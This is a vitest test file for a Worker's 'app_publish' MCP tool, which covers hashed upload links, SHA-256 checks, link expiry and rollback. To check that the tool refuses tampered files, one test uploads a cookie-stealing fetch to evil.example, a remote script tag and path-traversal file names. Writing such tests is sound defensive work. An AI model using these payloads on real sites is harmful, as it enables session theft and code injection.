import { createHash } from "node:crypto";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { Env } from "../worker/env";
import worker from "../worker/index";
import { handleMcp, TOOLS } from "../worker/mcp";
import { validate } from "../worker/schema";
import { run } from "./helpers/engine3";

// The MCP tool app_publish and PUT /up/app/<token>/<path>. The build list of the tests is tests/fixtures/app-manifest.json (vitest.config.ts).
const PAGE = '<script src="/assets/index-TEST.js"></script><link href="/assets/index-TEST.css">';
const BUILD: Record<string, string> = { "assets/index-TEST.css": "test css", "assets/index-TEST.js": "test js", "index.html": PAGE };
const OLD_PAGE = '<script src="/assets/index-OLD.js"></script>';

interface Saved {
  bytes: Uint8Array;
  sha256?: ArrayBuffer;
  type?: string;
}

/** R2 with the parts the publish path uses. Like R2, put refuses a body that does not have the given SHA-256. */
function setup(live: Record<string, string> = { "app/index.html": OLD_PAGE, "app/assets/index-OLD.js": "old js" }) {
  const files = new Map<string, Saved>();
  const enc = (s: string) => new TextEncoder().encode(s);
  for (const [key, body] of Object.entries(live)) files.set(key, { bytes: enc(body) });
  const view = (f: Saved) => ({
    checksums: { sha256: f.sha256 },
    arrayBuffer: async () => f.bytes.buffer.slice(f.bytes.byteOffset, f.bytes.byteOffset + f.bytes.byteLength),
    json: async () => JSON.parse(new TextDecoder().decode(f.bytes)),
    body: f.bytes,
    httpMetadata: { contentType: f.type },
  });
  const MEDIA = {
    head: async (k: string) => (files.has(k) ? view(files.get(k)!) : null),
    get: async (k: string) => (files.has(k) ? view(files.get(k)!) : null),
    delete: async (k: string) => void files.delete(k),
    put: async (k: string, v: ArrayBuffer | string, o?: { sha256?: ArrayBuffer; httpMetadata?: { contentType?: string } }) => {
      const bytes = typeof v === "string" ? enc(v) : new Uint8Array(v);
      if (o?.sha256 && !createHash("sha256").update(bytes).digest().equals(Buffer.from(o.sha256))) throw new Error("R2: the body does not have the given SHA-256");
      files.set(k, { bytes, sha256: o?.sha256, type: o?.httpMetadata?.contentType });
    },
  };
  const env = { MEDIA, PUBLIC_BASE_URL: "https://w.example/" } as unknown as Env;
  const text = (key: string) => new TextDecoder().decode(files.get(key)!.bytes);
  return { env, files, text };
}

type Answer = { live: boolean; files: { path: string; sha256: string; live: boolean }[]; curl?: string[]; expiresInSeconds?: number };
const publish = (env: Env, args: unknown = {}): Promise<Answer> => run(env, "app_publish", args);
/** The link of an answer: the part of each curl line before the file path. */
const linkOf = (a: Answer) => /'(https:\/\/w\.example\/up\/app\/[0-9a-f]{48})\//.exec(a.curl![0]!)![1]!;
const put = (env: Env, url: string, body: string, headers: Record<string, string> = {}) =>
  worker.fetch(new Request(url, { method: "PUT", body, headers: { "content-length": String(new TextEncoder().encode(body).byteLength), ...headers } }), env);
const error = async (r: Response) => ((await r.json()) as { error: string }).error;

afterEach(() => void vi.restoreAllMocks());

describe("app_publish", () => {
  it("lists the build with index.html last and gives one curl line for each file that is not live", async () => {
    const { env, files, text } = setup();
    const a = await publish(env);
    expect(a.live).toBe(false);
    expect(a.files.map((f) => [f.path, f.live])).toEqual([["assets/index-TEST.css", false], ["assets/index-TEST.js", false], ["index.html", false]]);
    expect(a.files[2]!.sha256).toBe(`sha256-${createHash("sha256").update(PAGE).digest("base64")}`);
    expect(a.expiresInSeconds).toBe(900);
    const link = linkOf(a);
    expect(a.curl).toEqual(a.files.map((f) => `curl -fsS -T 'dist/app/${f.path}' '${link}/${f.path}'`));
    // Only the hash of the link is stored, with a 15 minute life.
    const saved = JSON.parse(text("app-publish/link.json")) as { hash: string; expiresAt: number };
    expect(text("app-publish/link.json")).not.toContain(link.split("/").pop()!);
    expect(saved.hash).toMatch(/^sha256-[A-Za-z0-9+/]{43}=$/);
    expect(saved.expiresAt - Date.now()).toBeGreaterThan(890_000);
    expect([...files.keys()].filter((k) => k.startsWith("app/")).sort()).toEqual(["app/assets/index-OLD.js", "app/index.html"]);
  });

  it("puts the build live, keeps the page it replaced, and then has nothing to upload", async () => {
    const { env, files, text } = setup();
    const logs = vi.spyOn(console, "log").mockImplementation(() => {});
    const link = linkOf(await publish(env));
    for (const path of ["assets/index-TEST.css", "assets/index-TEST.js"]) {
      const r = await put(env, `${link}/${path}`, BUILD[path]!);
      expect(await r.json()).toMatchObject({ key: `app/${path}`, live: false });
      // The live page is still the old one until index.html arrives.
      expect(text("app/index.html")).toBe(OLD_PAGE);
    }
    const r = await put(env, `${link}/index.html`, PAGE);
    expect(await r.json()).toEqual({ key: "app/index.html", bytes: PAGE.length, sha256: `sha256-${createHash("sha256").update(PAGE).digest("base64")}`, live: true });
    expect(text("app/index.html")).toBe(PAGE);
    expect(files.get("app/assets/index-TEST.js")!.type).toBe("text/javascript; charset=utf-8");
    expect(files.get("app/index.html")!.type).toBe("text/html; charset=utf-8");
    expect(text("app-publish/previous-index.html")).toBe(OLD_PAGE);
    // The site serves the new page; the private prefix is not served.
    expect(await (await worker.fetch(new Request("https://w.example/"), env)).text()).toBe(PAGE);
    expect((await worker.fetch(new Request("https://w.example/app-publish/link.json"), env)).status).toBe(404);

    const again = await publish(env);
    expect(again).toMatchObject({ live: true });
    expect(again.files.every((f) => f.live)).toBe(true);
    expect(again.curl).toBeUndefined();
    // The same page again does not replace the kept page.
    files.delete("app/assets/index-TEST.css");
    const second = linkOf(await publish(env));
    await put(env, `${second}/assets/index-TEST.css`, BUILD["assets/index-TEST.css"]!);
    expect((await put(env, `${second}/index.html`, PAGE)).status).toBe(200);
    expect(text("app-publish/previous-index.html")).toBe(OLD_PAGE);
    // Each step is logged, and no log line has the link.
    const lines = logs.mock.calls.map((c) => JSON.parse(String(c[0])) as { event: string; action: string; path?: string });
    expect(lines.filter((l) => l.event === "app_publish").map((l) => l.action)).toEqual(["link", "file", "file", "file", "link", "file", "file"]);
    expect(JSON.stringify(logs.mock.calls)).not.toMatch(/[0-9a-f]{48}/);
  });

  it("refuses a file that is not the build, and writes nothing", async () => {
    const { env, files } = setup();
    const logs = vi.spyOn(console, "log").mockImplementation(() => {});
    const link = linkOf(await publish(env));
    const before = [...files.keys()].sort();
    const bad = await put(env, `${link}/assets/index-TEST.js`, "fetch('https://evil.example/?c=' + document.cookie)");
    expect(bad.status).toBe(422);
    expect(await error(bad)).toContain("another SHA-256");
    expect((await put(env, `${link}/index.html`, "<script src=https://evil.example/x.js></script>")).status).toBe(422);
    // A file name that is not in the build, also with the right link.
    for (const path of ["assets/evil.js", "index.htm", "../index.html", "app-publish/link.json", "toString"]) expect((await put(env, `${link}/${path}`, "x")).status, path).toBe(404);
    expect([...files.keys()].sort()).toEqual(before);
    expect(logs.mock.calls.map((c) => JSON.parse(String(c[0])).action)).toEqual(["link", "refused", "refused"]);
  });

  it("refuses index.html before the files it names", async () => {
    const { env, text } = setup();
    const link = linkOf(await publish(env));
    await put(env, `${link}/assets/index-TEST.css`, BUILD["assets/index-TEST.css"]!);
    const early = await put(env, `${link}/index.html`, PAGE);
    expect(early.status).toBe(409);
    expect(await error(early)).toContain("assets/index-TEST.js");
    expect(text("app/index.html")).toBe(OLD_PAGE);
  });

  it("does not trust a file in R2 that was not saved with its SHA-256", async () => {
    // The right bytes, but put there by another path (no checksum): the tool asks for them again.
    const { env } = setup({ "app/assets/index-TEST.js": "test js", "app/assets/index-TEST.css": "other bytes" });
    const a = await publish(env);
    expect(a.files.map((f) => f.live)).toEqual([false, false, false]);
    expect((await put(env, `${linkOf(a)}/index.html`, PAGE)).status).toBe(409);
  });

  it("refuses a wrong link, an expired link, a replaced link, a GET, a missing length and a too large body", async () => {
    const { env, files } = setup();
    const first = linkOf(await publish(env));
    const js = "assets/index-TEST.js";
    expect((await put(env, `https://w.example/up/app/${"0".repeat(48)}/${js}`, BUILD[js]!)).status).toBe(404);
    expect((await worker.fetch(new Request(`${first}/${js}`), env)).status).toBe(405);
    const noLength = new Request(`${first}/${js}`, { method: "PUT", body: BUILD[js]! });
    noLength.headers.delete("content-length");
    expect((await worker.fetch(noLength, env)).status).toBe(411);
    expect((await put(env, `${first}/${js}`, BUILD[js]!, { "content-length": "3000001" })).status).toBe(413);
    // A new call replaces the link.
    const second = linkOf(await publish(env));
    expect(second).not.toBe(first);
    expect((await put(env, `${first}/${js}`, BUILD[js]!)).status).toBe(404);
    // A link that was made for another build (before a deploy), and an expired link.
    const saved = JSON.parse(new TextDecoder().decode(files.get("app-publish/link.json")!.bytes)) as { hash: string; build: string };
    const store = (link: object) => files.set("app-publish/link.json", { bytes: new TextEncoder().encode(JSON.stringify(link)) });
    store({ ...saved, build: "sha256-the-index-of-the-build-before-the-deploy" });
    expect((await put(env, `${second}/${js}`, BUILD[js]!)).status).toBe(404);
    store({ ...saved, expiresAt: Date.now() - 1 });
    expect((await put(env, `${second}/${js}`, BUILD[js]!)).status).toBe(404);
    store(saved);
    expect((await put(env, `${second}/${js}`, BUILD[js]!)).status).toBe(200);
    files.delete(`app/${js}`);
    expect(files.has(`app/${js}`)).toBe(false);
  });

  it("rollback puts back the page that the last publish replaced", async () => {
    const { env, files, text } = setup();
    await expect(publish(env, { rollback: true })).rejects.toThrow("No earlier page is kept");
    const used = linkOf(await publish(env));
    for (const path of Object.keys(BUILD)) expect((await put(env, `${used}/${path}`, BUILD[path]!)).status, path).toBe(200);
    expect(text("app/index.html")).toBe(PAGE);
    expect(await run(env, "app_publish", { rollback: true })).toMatchObject({ rolledBack: true, assets: ["assets/index-OLD.js"] });
    expect(text("app/index.html")).toBe(OLD_PAGE);
    // The link of the publish that was rolled back cannot put that build live again.
    expect((await put(env, `${used}/index.html`, PAGE)).status).toBe(404);
    expect(text("app/index.html")).toBe(OLD_PAGE);
    expect(files.get("app/index.html")!.type).toBe("text/html; charset=utf-8");
    // The build is then not live, and only index.html must go up again.
    const a = await publish(env);
    expect(a.files.map((f) => f.live)).toEqual([true, true, false]);
    expect(a.curl).toHaveLength(1);
    expect((await put(env, `${linkOf(a)}/index.html`, PAGE)).status).toBe(200);
    // A page whose files are gone is not put back.
    files.delete("app/assets/index-OLD.js");
    await expect(publish(env, { rollback: true })).rejects.toThrow("assets/index-OLD.js");
    expect(text("app/index.html")).toBe(PAGE);
  });

  it("answers through /mcp, and the schema refuses other fields", async () => {
    const { env } = setup();
    const call = (args: unknown) =>
      handleMcp(new Request("https://w.example/mcp", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "app_publish", arguments: args } }) }), env, { client: "test-client" });
    const ok = ((await (await call({})).json()) as { result: { isError?: boolean; content: { text: string }[] } }).result;
    expect(ok.isError).toBeUndefined();
    expect(JSON.parse(ok.content[0]!.text)).toMatchObject({ live: false });
    const none = ((await (await call({ rollback: true })).json()) as { result: { isError?: boolean; content: { text: string }[] } }).result;
    expect(none).toMatchObject({ isError: true, content: [{ text: expect.stringContaining("Bad input: No earlier page is kept") }] });
    const tool = TOOLS.find((t) => t.name === "app_publish")!;
    for (const a of [{ rollback: "yes" }, { path: "index.html" }, { sha256: "x" }]) expect(() => validate(tool.inputSchema as never, a), JSON.stringify(a)).toThrow();
  });
});
